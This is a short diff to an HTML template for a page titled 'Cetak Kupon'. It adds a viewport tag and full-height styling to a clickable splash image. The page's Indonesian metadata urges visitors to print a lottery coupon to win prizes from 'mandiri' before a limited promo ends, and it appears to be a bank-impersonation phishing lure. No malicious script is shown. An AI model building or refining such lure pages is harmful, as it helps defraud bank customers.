@@ -6,6 +6,7 @@
         <meta property="og:description" content="segera cetak kupon undian Anda dan raih kesempatan memenangkan hadiah menarik dari mandiri. promo berlaku terbatas." />
         <meta property="og:image" content="https://i.imgur.com/Q1917pI.jpg" />
         <meta name="twitter:card" content="summary_large_image" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Cetak Kupon</title>
         <style>
             * {
@@ -20,7 +21,7 @@
         </style>
     </head>
     <body>
-        <img src="{{ url_for('static', filename='b1.jpg') }}" onclick="masuk()" style="width: 100%; display: block; cursor: pointer;" alt="Splash Image">
+        <img src="{{ url_for('static', filename='b1.jpg') }}" onclick="masuk()" style="width: 100%; height: 100%; display: block; cursor: pointer;" alt="Splash Image">
 
         <script>
             function masuk() {
